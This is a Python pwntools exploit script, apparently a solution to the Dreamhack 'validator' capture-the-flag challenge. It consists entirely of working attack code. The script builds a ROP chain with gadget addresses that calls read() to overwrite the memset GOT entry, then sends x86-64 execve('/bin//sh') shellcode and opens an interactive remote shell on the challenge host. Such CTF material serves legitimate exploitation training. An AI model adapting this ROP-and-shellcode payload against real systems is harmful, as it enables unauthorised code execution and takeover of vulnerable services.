from pwn import *

context.arch = "amd64"
context.log_level = "debug"

LOCAL = False
if LOCAL:
    p = process("./validator_dist")
    elf = ELF("./validator_dist")
else:
    PORT = int(input("PORT: "))
    HOST = int(input("HOST: "))
    p = remote("host"+str(HOST)+".dreamhack.games", PORT)
    elf = ELF("./validator_server")


def slog(name, addr):
    return success(name + ": " + str(hex(addr)))


def validate(size, second):
    result = b""
    for i in range(size, second, -1):
        result += bytes([i])
    log.info(result)
    return result


word_size = 117
pop_rdi = 0x4006f3
pop_rsi_r15 = 0x4006f1
pop_rdx = 0x40057b
memset_got = elf.got["memset"]
read_plt = elf.plt["read"]

payload = b"DREAMHACK!"
payload += b" "
payload += validate(word_size, 0)
log.info(validate(word_size, 0))
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi_r15)
payload += p64(memset_got)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(100)
payload += p64(read_plt)
payload += p64(memset_got)


p.sendline(payload)
p.sendline("\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05")


p.interactive()
